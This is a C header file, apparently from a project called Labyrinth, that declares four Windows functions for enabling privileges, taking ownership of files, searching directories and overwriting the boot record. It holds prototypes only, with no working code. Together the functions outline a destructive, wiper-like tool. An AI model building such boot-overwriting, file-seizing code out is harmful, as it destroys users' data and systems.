#pragma once
#include "Labyrinth.h"

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ LPWSTR lpPriv,
	_In_ BOOL   bEnable
);

BOOL
WINAPI
TakeOwnership(
	_In_ LPWSTR lpFile
);

BOOL
WINAPI
FileSearch(
	_In_ LPWSTR szDirectory
);

BOOL
WINAPI
OverwriteBoot(
	VOID
);